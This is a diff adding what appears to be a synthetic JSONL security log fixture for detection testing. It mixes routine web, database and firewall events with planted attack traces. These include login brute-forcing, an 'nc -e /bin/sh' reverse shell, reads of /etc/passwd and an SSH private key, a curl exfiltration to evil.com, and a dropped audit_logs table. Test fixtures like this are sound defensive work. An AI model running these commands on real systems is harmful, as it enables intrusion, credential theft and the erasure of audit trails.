@@ -1,0 +1,40 @@
+{"timestamp": "2025-01-30T10:00:00.000Z", "host": "web-01", "event_type": "http_request", "source_ip": "10.0.0.50", "method": "GET", "path": "/api/users", "status": 200}
+{"timestamp": "2025-01-30T10:00:00.100Z", "host": "web-01", "event_type": "http_request", "source_ip": "10.0.0.51", "method": "GET", "path": "/api/products", "status": 200}
+{"timestamp": "2025-01-30T10:00:00.200Z", "host": "auth-01", "event_type": "login_attempt", "source_ip": "192.168.1.10", "user": "admin", "status": "failed"}
+{"timestamp": "2025-01-30T10:00:00.300Z", "host": "web-01", "event_type": "http_request", "source_ip": "10.0.0.52", "method": "POST", "path": "/api/orders", "status": 201}
+{"timestamp": "2025-01-30T10:00:00.400Z", "host": "auth-01", "event_type": "login_attempt", "source_ip": "192.168.1.10", "user": "root", "status": "failed"}
+{"timestamp": "2025-01-30T10:00:00.500Z", "host": "db-01", "event_type": "query", "source_ip": "10.0.0.100", "query_type": "SELECT", "table": "users", "rows": 150}
+{"timestamp": "2025-01-30T10:00:00.600Z", "host": "auth-01", "event_type": "login_attempt", "source_ip": "192.168.1.10", "user": "administrator", "status": "failed"}
+{"timestamp": "2025-01-30T10:00:00.700Z", "host": "web-01", "event_type": "http_request", "source_ip": "45.33.32.156", "method": "GET", "path": "/admin", "status": 403}
+{"timestamp": "2025-01-30T10:00:00.800Z", "host": "auth-01", "event_type": "login_attempt", "source_ip": "192.168.1.10", "user": "test", "status": "failed"}
+{"timestamp": "2025-01-30T10:00:00.900Z", "host": "app-01", "event_type": "process_start", "process": "python", "cmdline": "python app.py", "user": "appuser"}
+{"timestamp": "2025-01-30T10:00:01.000Z", "host": "auth-01", "event_type": "login_attempt", "source_ip": "192.168.1.10", "user": "guest", "status": "failed"}
+{"timestamp": "2025-01-30T10:00:01.100Z", "host": "web-01", "event_type": "http_request", "source_ip": "10.0.0.53", "method": "GET", "path": "/api/health", "status": 200}
+{"timestamp": "2025-01-30T10:00:01.200Z", "host": "auth-01", "event_type": "login_attempt", "source_ip": "192.168.1.10", "user": "support", "status": "failed"}
+{"timestamp": "2025-01-30T10:00:01.300Z", "host": "db-01", "event_type": "query", "source_ip": "10.0.0.100", "query_type": "INSERT", "table": "orders", "rows": 1}
+{"timestamp": "2025-01-30T10:00:01.400Z", "host": "app-01", "event_type": "process_start", "process": "nc", "cmdline": "nc -e /bin/sh 45.33.32.156 4444", "user": "www-data"}
+{"timestamp": "2025-01-30T10:00:01.500Z", "host": "web-01", "event_type": "http_request", "source_ip": "10.0.0.54", "method": "GET", "path": "/api/users/1", "status": 200}
+{"timestamp": "2025-01-30T10:00:01.600Z", "host": "auth-01", "event_type": "login_attempt", "source_ip": "10.0.0.25", "user": "alice", "status": "success"}
+{"timestamp": "2025-01-30T10:00:01.700Z", "host": "fw-01", "event_type": "connection", "source_ip": "10.0.0.100", "dest_ip": "185.220.101.1", "dest_port": 443, "action": "allow"}
+{"timestamp": "2025-01-30T10:00:01.800Z", "host": "web-01", "event_type": "http_request", "source_ip": "45.33.32.156", "method": "POST", "path": "/api/login", "status": 401}
+{"timestamp": "2025-01-30T10:00:01.900Z", "host": "db-01", "event_type": "query", "source_ip": "10.0.0.100", "query_type": "SELECT", "table": "credentials", "rows": 500}
+{"timestamp": "2025-01-30T10:00:02.000Z", "host": "auth-01", "event_type": "login_attempt", "source_ip": "198.51.100.100", "user": "admin", "status": "failed"}
+{"timestamp": "2025-01-30T10:00:02.100Z", "host": "web-01", "event_type": "http_request", "source_ip": "10.0.0.55", "method": "GET", "path": "/api/products/123", "status": 200}
+{"timestamp": "2025-01-30T10:00:02.200Z", "host": "auth-01", "event_type": "login_attempt", "source_ip": "198.51.100.100", "user": "root", "status": "failed"}
+{"timestamp": "2025-01-30T10:00:02.300Z", "host": "app-01", "event_type": "file_access", "path": "/etc/passwd", "user": "www-data", "action": "read"}
+{"timestamp": "2025-01-30T10:00:02.400Z", "host": "auth-01", "event_type": "login_attempt", "source_ip": "198.51.100.100", "user": "user", "status": "failed"}
+{"timestamp": "2025-01-30T10:00:02.500Z", "host": "fw-01", "event_type": "connection", "source_ip": "10.0.0.75", "dest_ip": "8.8.8.8", "dest_port": 53, "action": "allow"}
+{"timestamp": "2025-01-30T10:00:02.600Z", "host": "auth-01", "event_type": "login_attempt", "source_ip": "198.51.100.100", "user": "postgres", "status": "failed"}
+{"timestamp": "2025-01-30T10:00:02.700Z", "host": "web-01", "event_type": "http_request", "source_ip": "45.33.32.156", "method": "GET", "path": "/.env", "status": 404}
+{"timestamp": "2025-01-30T10:00:02.800Z", "host": "auth-01", "event_type": "login_attempt", "source_ip": "198.51.100.100", "user": "mysql", "status": "failed"}
+{"timestamp": "2025-01-30T10:00:02.900Z", "host": "app-01", "event_type": "file_access", "path": "/home/deploy/.ssh/id_rsa", "user": "www-data", "action": "read"}
+{"timestamp": "2025-01-30T10:00:03.000Z", "host": "auth-01", "event_type": "login_attempt", "source_ip": "198.51.100.100", "user": "oracle", "status": "failed"}
+{"timestamp": "2025-01-30T10:00:03.100Z", "host": "web-01", "event_type": "http_request", "source_ip": "10.0.0.56", "method": "PUT", "path": "/api/users/5", "status": 200}
+{"timestamp": "2025-01-30T10:00:03.200Z", "host": "db-01", "event_type": "query", "source_ip": "10.0.0.100", "query_type": "DROP", "table": "audit_logs", "rows": 0}
+{"timestamp": "2025-01-30T10:00:03.300Z", "host": "fw-01", "event_type": "connection", "source_ip": "10.0.0.100", "dest_ip": "203.0.113.50", "dest_port": 22, "action": "allow"}
+{"timestamp": "2025-01-30T10:00:03.400Z", "host": "app-01", "event_type": "process_start", "process": "curl", "cmdline": "curl -X POST https://evil.com/exfil -d @/tmp/data.tar.gz", "user": "www-data"}
+{"timestamp": "2025-01-30T10:00:03.500Z", "host": "web-01", "event_type": "http_request", "source_ip": "45.33.32.156", "method": "GET", "path": "/wp-admin", "status": 404}
+{"timestamp": "2025-01-30T10:00:03.600Z", "host": "auth-01", "event_type": "login_attempt", "source_ip": "10.0.0.30", "user": "bob", "status": "success"}
+{"timestamp": "2025-01-30T10:00:03.700Z", "host": "db-01", "event_type": "query", "source_ip": "10.0.0.100", "query_type": "SELECT", "table": "credit_cards", "rows": 10000}
+{"timestamp": "2025-01-30T10:00:03.800Z", "host": "web-01", "event_type": "http_request", "source_ip": "10.0.0.57", "method": "DELETE", "path": "/api/users/99", "status": 204}
+{"timestamp": "2025-01-30T10:00:03.900Z", "host": "fw-01", "event_type": "connection", "source_ip": "10.0.0.100", "dest_ip": "91.219.236.222", "dest_port": 443, "action": "deny"}
